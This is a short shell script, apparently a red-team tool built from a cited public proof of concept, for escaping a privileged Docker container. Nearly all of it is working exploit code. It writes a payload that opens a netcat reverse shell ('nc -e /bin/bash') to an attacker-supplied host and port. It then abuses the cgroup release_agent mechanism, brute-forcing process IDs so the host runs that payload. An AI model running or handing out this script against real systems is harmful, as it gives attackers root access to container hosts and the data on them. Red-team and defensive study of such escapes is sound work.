#!/bin/sh
# Privileged Container escape.
# This will escape a docker container and spawn a reverse shell to host if container runs privileged.
# Weaponized by Mikael Kall to be used in red-teaming.
# Original PoC: https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html

SCRIPT_DIR=$(dirname $0)
cd ${SCRIPT_DIR}

if [[  $# -le 1 ]]; then
    echo "Usage: ${0} <LHOST> <LPORT>"
    exit
fi

LHOST="${1}"
LPORT="${2}"

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

# Payload to run.
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
/bin/nc ${LHOST} ${LPORT} -e /bin/bash &
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Pid: ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      exit 1
    fi
  fi
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > /tmp/cgrp/release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))

done